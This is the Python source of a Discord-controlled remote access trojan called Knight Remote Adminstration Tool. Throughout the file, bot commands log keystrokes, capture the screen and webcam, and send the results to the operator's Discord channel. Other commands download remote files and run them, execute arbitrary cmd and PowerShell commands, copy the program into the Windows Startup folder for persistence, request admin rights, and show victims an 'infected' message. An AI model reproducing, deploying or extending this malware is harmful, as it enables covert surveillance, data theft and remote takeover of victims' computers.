import discord
import sys
import os
import random
import socket
import webbrowser
import ctypes
import subprocess
import pygame
import pygame.camera
import requests
import win32con
import keyboard
import time
import shutil
from config import Config
from sys import argv
from PIL import ImageGrab
from discord.ext import commands
cc = Config()

### CONFIG

btoken = cc.get_knight_discord_rat_bot_token() ### NOT OPTIONAL | DISCORD BOT TOKEN NEEDS TO BE PUT HERE FOR THE RAT TO WORK
prefix = cc.get_knight_discord_rat_prefix() ### OPTIONAL | IGNORE THIS IF YOU WANT TO RUN COMMANDS WITHOUT A PREFIX | PREFIX THE DISCORD BOT WILL BE CALLED WITH
userid = cc.get_knight_discord_rat_listener_user_id() ### OPTIONAL | IGNORE THIS IF YOU DON'T WANT TO BE PINGED | ONLY WORKS WITH CHANNELID SET | THIS IS THE USER WHO WILL BE NOTIFIED ABOUT NEW CLIENTS WITH A PING
channelid = cc.get_knight_discord_rat_channel_id() ### OPTIONAL | ONLY SET IF YOU WANT TO GET A MESSAGE WHEN NEW CLIENTS GET ONLINE

### DEV CONFIG

pygame.camera.init()
dscrd = 'https://discord.gg/rHdqqqYVzY'
roaming = os.getenv("appdata")
startup_loc = os.path.join(roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
hostname = socket.gethostname()
cwd = os.getcwd()
intents = discord.Intents.all()
bot = commands.Bot(description=f"Running Knight Remote Adminstration Tool.", command_prefix=prefix, intents=intents)
clientid = ''.join(random.choice('0123456789') for i in range(6))
def get_random_string(length):
    letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    global result_str
    result_str = ''.join(random.choice(letters) for i in range(length))

if channelid == '':
    pass
else:
    @bot.event
    async def on_ready():
        usrmention = f'<@{userid}>'
        channel = bot.get_channel(int(channelid))
        if userid == '':
            await channel.send(f"New client online: process {clientid}")
        else:
            await channel.send(f"{usrmention} | New client online: process {clientid}")

@bot.command(name='open')
async def open(ctx, inputid, fpath):
    if inputid == clientid:
        try:
            os.system(fpath)
            await ctx.send(f'Successfully ran file with the path `{fpath}` for process {clientid}.')
        except Exception:
            await ctx.send(f'Couldn\'t run file with the path `{fpath}` for process {clientid} because of `{Exception}`.')
    if inputid != clientid:
        if inputid == 'all':
            try:
                os.system(fpath)
                await ctx.send(f'Successfully ran file with the path `{fpath}` for process {clientid}.')
            except Exception:
                await ctx.send(f'Couldn\'t run file with the path `{fpath}` for process {clientid} because of `{Exception}`.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='taskschd')
async def taskschd(ctx, inputid):
    if inputid == clientid:
        try:
            os.system('taskschd.msc')
            await ctx.send(f'Successfully started windows task scheduler for process {clientid}.')
        except Exception:
            await ctx.send(f'Couldn\'t start windows task scheduler for process {clientid} because of `{Exception}`.')
    if inputid != clientid:
        if inputid == 'all':
            try:
                os.system('taskschd.msc')
                await ctx.send(f'Successfully started windows task scheduler for process {clientid}.')
            except Exception:
                await ctx.send(f'Couldn\'t start windows task scheduler for process {clientid} because of `{Exception}`.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='keylogger')
async def keylogger(ctx, inputid, duration):
    if inputid == clientid:
        get_random_string(15)
        record_time = duration ### DURATION OF KEYLOGGER IN SECONDS
        fname = f'keylogger_finaldata_CLIENTID_{clientid}_{result_str}{duration}.txt'
        end_time = time.monotonic() + int(record_time)
        recorded = []
        try:
            await ctx.send(f'Started keylogger for process {clientid} with a duration of `{duration}` seconds without any problems. You will be notified in `{duration}` seconds, when the final data is being posted.')
            while True:
                if time.monotonic() >= end_time:
                    break
                recorded.append(keyboard.read_event())
        except KeyboardInterrupt:
            await ctx.send(f'Keylogger was killed by secret keystroke for process {clientid} because of `{Exception}`. Exe has been compiled without `--noconsole` probably.')
            pass
        except Exception:
            await ctx.send(f'Couldn\'t start keylogger for process {clientid} because of `{Exception}`.')
        
        with open(fname, 'w') as f:
            for keystroke in recorded:
                if keystroke.event_type == 'down':
                    if str('up') in str(keystroke):
                        str(keystroke).upper()
                    if str('down') in str(keystroke):
                        str(keystroke).lower()
                    f.write(str(f'''{keystroke}
'''.replace('KeyboardEvent', '').replace('(', '').replace(')', '').replace(' up', '').replace(' down', '')))
        await ctx.send(file=discord.File(fname))
        await ctx.send(f'Keylogger data file `{fname}` from process {clientid} was sent.')
        os.remove(fname)
    if inputid != clientid:
        if inputid == 'all':
            get_random_string(15)
            record_time = duration ### DURATION OF KEYLOGGER IN SECONDS
            fname = f'keylogger_finaldata_CLIENTID_{clientid}_{result_str}{duration}.txt'
            end_time = time.monotonic() + int(record_time)
            recorded = []
            try:
                await ctx.send(f'Started keylogger for process {clientid} with a duration of `{duration}` seconds without any problems. You will be notified in `{duration}` seconds, when the final data is being posted.')
                while True:
                    if time.monotonic() >= end_time:
                        break
                    recorded.append(keyboard.read_event())
            except KeyboardInterrupt:
                await ctx.send(f'Keylogger was killed by secret keystroke for process {clientid} because of `{Exception}`. Exe has been compiled without `--noconsole` probably.')
                pass
            except Exception:
                await ctx.send(f'Couldn\'t start keylogger for process {clientid} because of `{Exception}`.')
        
            with open(fname, 'w') as f:
                for keystroke in recorded:
                    if keystroke.event_type == 'down':
                        if str('up') in str(keystroke):
                            str(keystroke).upper()
                        if str('down') in str(keystroke):
                            str(keystroke).lower()
                        f.write(str(f'''{keystroke}
'''.replace('KeyboardEvent', '').replace('(', '').replace(')', '').replace(' up', '').replace(' down', '')))
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Keylogger data file `{fname}` from process {clientid} was sent.')
            os.remove(fname)
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='msgbox')
async def msgbox(ctx, inputid, title, msg):
    if inputid == clientid:
        emojis = ['✅', '❌']
        prmtn = await ctx.send(f'Final message box is ready to be sent to process {clientid}. Are we allowed to promote Knight Remote Adminstration Tool a little with it?')
        for emoji in emojis:
            await prmtn.add_reaction(emoji)
        @bot.event
        async def on_reaction_add(reaction, user):
            MB_OK = 0x0 ### BUTTON
            ICON_EXCLAIM = 0x30 ### ICON
            emoji = reaction.emoji
            if user.bot:
                return
            if emoji == '✅':
                try:
                    ctypes.windll.user32.MessageBoxW(0, str(f'Join the Discord server: {dscrd} | Individual user message: ' + msg), str('Your PC is infected by Knight Remote Adminstration Tool! | Individual user title: ' + title),  MB_OK | ICON_EXCLAIM) ### FINAL MSGBOX WITH PROMOTION
                    await ctx.send(f'Successfully showed message box with promotion for process {clientid}.')
                except Exception:
                    await ctx.send(f'Couldn\'t show message box for process {clientid} because of `{Exception}`.')
                return
            elif emoji == '❌':
                try:
                    ctypes.windll.user32.MessageBoxW(0, str(msg), str(title),  MB_OK | ICON_EXCLAIM) ### FINAL MSGBOX WITHOUT PROMOTION
                    await ctx.send(f'Successfully showed message box without promotion for process {clientid}.')
                except Exception:
                    await ctx.send(f'Couldn\'t show message box for process {clientid} because of `{Exception}`.')
                return
            else:
                return
    if inputid != clientid:
        if inputid == 'all':
            emojis = ['✅', '❌']
            prmtn = await ctx.send(f'Final message box is ready to be sent to process {clientid}. Are we allowed to promote Knight Remote Adminstration Tool a little with it?')
            for emoji in emojis:
                await prmtn.add_reaction(emoji)
            @bot.event
            async def on_reaction_add(reaction, user):
                MB_OK = 0x0 ### BUTTON
                ICON_EXCLAIM = 0x30 ### ICON
                emoji = reaction.emoji
                if user.bot:
                    return
                if emoji == '✅':
                    try:
                        ctypes.windll.user32.MessageBoxW(0, str(f'Join the Discord server: {dscrd} | Individual user message: ' + msg), str('Your PC is infected by Knight Remote Adminstration Tool! | Individual user title: ' + title),  MB_OK | ICON_EXCLAIM) ### FINAL MSGBOX WITH PROMOTION
                        await ctx.send(f'Successfully showed message box with promotion for process {clientid}.')
                    except Exception:
                        await ctx.send(f'Couldn\'t show message box for process {clientid} because of `{Exception}`.')
                    return
                elif emoji == '❌':
                    try:
                        ctypes.windll.user32.MessageBoxW(0, str(msg), str(title),  MB_OK | ICON_EXCLAIM) ### FINAL MSGBOX WITHOUT PROMOTION
                        await ctx.send(f'Successfully showed message box without promotion for process {clientid}.')
                    except Exception:
                        await ctx.send(f'Couldn\'t show message box for process {clientid} because of `{Exception}`.')
                    return
                else:
                    return
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='screenshot')
async def screenshot(ctx, inputid):
    if inputid == clientid:
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        fname = f'screenshot_{clientid}.png'
        image.save(fname)
        await ctx.send(file=discord.File(fname))
        await ctx.send(f'Screenshot `{fname}` from process {clientid} was sent.')
        os.remove(fname)
    if inputid != clientid:
        if inputid == 'all':
            image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            fname = f'screenshot_{clientid}.png'
            image.save(fname)
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Screenshot `{fname}` from process {clientid} was sent.')
            os.remove(fname)
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
       
@bot.command(name='startup')
async def startup(ctx, inputid):
    if inputid == clientid:
        try:
            shutil.copy(argv[0], startup_loc)
            await ctx.send(f'Successfully copied file `{argv[0]}` from process {clientid} to `{startup_loc}`.')
        except Exception:
            await ctx.send(f'Failed to copy file `{argv[0]}` from process {clientid} to `{startup_loc}`.')
    if inputid != clientid:
        if inputid == 'all':
            try:
                shutil.copy(argv[0], startup_loc)
                await ctx.send(f'Successfully copied file `{argv[0]}` from process {clientid} to `{startup_loc}`.')
            except Exception:
                await ctx.send(f'Failed to copy file `{argv[0]}` from process {clientid} to `{startup_loc}`.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='upload')
async def upload(ctx, inputid, dwnldlink, filetype): ### PUT FILE TYPES LIKE .png, .exe, .msi, .txt AND MORE THERE WHEN USING THE COMMAND
    if inputid == clientid:
        get_random_string(15)
        r = requests.get(dwnldlink, allow_redirects=False)
        fname = f'filedwnldfrweb_CLIENTID_{clientid}_{result_str}{filetype}'
        open(fname, 'wb').write(r.content)
        emojis = ['✅', '❌']
        msg = await ctx.send(f'Downloaded file `{dwnldlink}` with the filetype `{filetype}` to process {clientid}. Should the file be executed directly?')
        for emoji in emojis:
            await msg.add_reaction(emoji)
        @bot.event
        async def on_reaction_add(reaction, user):
            emoji = reaction.emoji
            if user.bot:
                return
            if emoji == '✅':
                try:
                    os.system(fname)
                    await ctx.send(f'Successfully executed scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid}.')
                except Exception:
                    await ctx.send(f'Couldn\'t execute scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid} because of `{Exception}`.')
                return
            elif emoji == '❌':
                await ctx.send(f'Okay, scraped file `{dwnldlink}` with the filetype `{filetype}` is not going to be executed for process {clientid}.')
                return
            else:
                return
    if inputid != clientid:
        if inputid == 'all':
            get_random_string(15)
            r = requests.get(dwnldlink, allow_redirects=False)
            fname = f'filedwnldfrweb_CLIENTID_{clientid}_{result_str}{filetype}'
            open(fname, 'wb').write(r.content)
            emojis = ['✅', '❌']
            msg = await ctx.send(f'Downloaded file `{dwnldlink}` with the filetype `{filetype}` to process {clientid}. Should the file be executed directly?')
            for emoji in emojis:
                await msg.add_reaction(emoji)
            @bot.event
            async def on_reaction_add(reaction, user):
                emoji = reaction.emoji
                if user.bot:
                    return
                if emoji == '✅':
                    try:
                        os.system(fname)
                        await ctx.send(f'Successfully executed scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid}.')
                    except Exception:
                        await ctx.send(f'Couldn\'t execute scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid} because of `{Exception}`.')
                    return
                elif emoji == '❌':
                    await ctx.send(f'Okay, scraped file `{dwnldlink}` with the filetype `{filetype}` is not going to be executed for process {clientid}.')
                    return
                else:
                    return
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
                           
@bot.command(name='wallpaper')
async def wallpaper(ctx, inputid, rawimg):
    if inputid == clientid:
        r = requests.get(rawimg, allow_redirects=False)
        fname = f'newwallpaper_{clientid}.jpg' ### ONLY .jpg IMAGES
        open(fname, 'wb').write(r.content)
        path = os.path.abspath(fname)
        ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, path, changed)
        await ctx.send(f'Changed background wallpaper for {clientid} to `{rawimg}`.')
        os.remove(fname)
    if inputid != clientid:
        if inputid == 'all':
            r = requests.get(rawimg, allow_redirects=False)
            fname = f'newwallpaper_{clientid}.jpg' ### ONLY .jpg IMAGES
            open(fname, 'wb').write(r.content)
            path = os.path.abspath(fname)
            ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, path, changed)
            await ctx.send(f'Changed background wallpaper for {clientid} to `{rawimg}`.')
            os.remove(fname)
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='webcam')
async def webcam(ctx, inputid):
    if inputid == clientid:
        camlist = pygame.camera.list_cameras()
        fname = str(f'webcampicture_{clientid}.png')
        if camlist:
            cam = pygame.camera.Camera(camlist[0], (640, 480))
            cam.start()
            image = cam.get_image()
            pygame.image.save(image, fname)
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Webcam picture `{fname}` from process {clientid} was sent.')
            os.remove(fname)
        else:
            await ctx.send(f'No camera was found for process {clientid}.')
    if inputid != clientid:
        if inputid == 'all':
            camlist = pygame.camera.list_cameras()
            fname = str(f'webcampicture_{clientid}.png')
            if camlist:
                cam = pygame.camera.Camera(camlist[0], (640, 480))
                cam.start()
                image = cam.get_image()
                pygame.image.save(image, fname)
                await ctx.send(file=discord.File(fname))
                await ctx.send(f'Webcam picture `{fname}` from process {clientid} was sent.')
                os.remove(fname)
            else:
                await ctx.send(f'No camera was found for process {clientid}.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')

@bot.command(name='tasklist')
async def tasklist(ctx, inputid):
    if inputid == clientid:
        tasks = str(subprocess.check_output('tasklist', shell=True))
        fname = f'runningtasks_{clientid}.txt'
        with open(fname, 'w') as f:
            f.write(tasks)
        await ctx.send(file=discord.File(fname))
        await ctx.send(f'Wrote all current tasks from process {clientid} to `{fname}`.')
        os.remove(fname)
    if inputid != clientid:
        if inputid == 'all':
            tasks = str(subprocess.check_output('tasklist', shell=True))
            fname = f'runningtasks_{clientid}.txt'
            with open(fname, 'w') as f:
                f.write(tasks)
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Wrote all current tasks from process {clientid} to `{fname}`.')
            os.remove(fname)
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='killprocess')
async def killprocess(ctx, inputid, procname):
    if inputid == clientid:
        subprocess.run(f'taskkill /f /im {procname}', shell=True)
        await ctx.send(f'Initiated to kill process `{procname}` for client {clientid}.')
    if inputid != clientid:
        if inputid == 'all':
            subprocess.run(f'taskkill /f /im {procname}', shell=True)
            await ctx.send(f'Initiated to kill process `{procname}` for client {clientid}.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='excshell')
async def shell(ctx, inputid, cmd):
    if inputid == clientid:
        subprocess.run(f'start cmd /f /c {cmd}', shell=True)
        await ctx.send(f'Executed cmd command `{cmd}` for process {clientid}.')
    if inputid != clientid:
        if inputid == 'all':
            subprocess.run(f'start cmd /f /c {cmd}', shell=True)
            await ctx.send(f'Executed cmd command `{cmd}` for process {clientid}.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='excpowershell')
async def powershell(ctx, inputid, shllcmd):
    if inputid == clientid:
        subprocess.run(f'start powershell /c {shllcmd}', shell=True)
        await ctx.send(f'Executed shell command `{shllcmd}` for process {clientid}.')
    if inputid != clientid:
        if inputid == 'all':
            subprocess.run(f'start powershell /c {shllcmd}', shell=True)
            await ctx.send(f'Executed shell command `{shllcmd}` for process {clientid}.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='isadmin')
async def isadmin(ctx, inputid):
    if inputid == clientid:
        isadmin = ctypes.windll.shell32.IsUserAnAdmin()
        if isadmin:
            await ctx.send(f'Process {clientid} **is** admin.')
        if not isadmin:
            await ctx.send(f'Process {clientid} **is not** admin.')
    if inputid != clientid:
        if inputid == 'all':
            isadmin = ctypes.windll.shell32.IsUserAnAdmin()
            if isadmin:
                await ctx.send(f'Process {clientid} **is** admin.')
            if not isadmin:
                await ctx.send(f'Process {clientid} **is not** admin.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='getadmin')
async def getadmin(ctx, inputid):
    if inputid == clientid:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        await ctx.send(f'Requested admin access for process {clientid}.')
        sys.exit(0)
    if inputid != clientid:
        if inputid == 'all':
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            await ctx.send(f'Requested admin access for process {clientid}.')
            sys.exit(0)
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='quit')
async def quit(ctx, inputid):
    if inputid == clientid:
        await ctx.send(f'Terminated Knight Remote Adminstration Tool for {clientid}.')
        sys.exit(0)
    if inputid != clientid:
        if inputid == 'all':
            await ctx.send(f'Terminated Knight Remote Adminstration Tool for {clientid}.')
            sys.exit(0)
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='clients')
async def clients(ctx):
    await ctx.send(f'{hostname} - {clientid}.')
    
@bot.command(name='browser')
async def browser(ctx, inputid, url):
    if inputid == clientid:
        webbrowser.open(url)
        await ctx.send(f'Opened webbrowser `{url}` for process {clientid}.')
    if inputid != clientid:
        if inputid == 'all':
            webbrowser.open(url)
            await ctx.send(f'Opened webbrowser `{url}` for process {clientid}.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
def run_rat():
    bot.run(btoken)
